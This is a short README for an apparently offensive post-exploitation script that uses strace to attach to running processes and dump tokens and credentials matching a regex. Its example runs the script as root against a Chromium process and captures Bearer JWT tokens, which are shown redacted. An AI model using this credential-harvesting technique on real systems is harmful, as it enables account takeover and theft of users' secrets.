# Scripts

## ptrace_secret_dump

### Description
This script will use `strace` to attach to running processes and search for the strings matching the
`regex` provided. It is useful in post-exploitation for dumping tokens and credentials after you
have privileged access (or when `sys.yama.ptrace == 0`).

### Example

Dumping JWT tokens from a running `chrom{e,ium}` process.

```
root@host:~# ./ptrace_secret_dump 'Bearer [a-zA-Z0-9-_+/.]*' /tmp/jwt_tokens chro
[+] - Looking for regex 'Bearer [a-zA-Z0-9-_+/.]*' and outputing to /tmp/out
[+] - Press Ctrl-C to terminate execution.
[+] - Starting cleanup...
[+] - Uniq token values:
Bearer <REDACTED_TOKEN>
Bearer <REDACTED_TOKEN>
[+] - Killing ptrace processes.

```

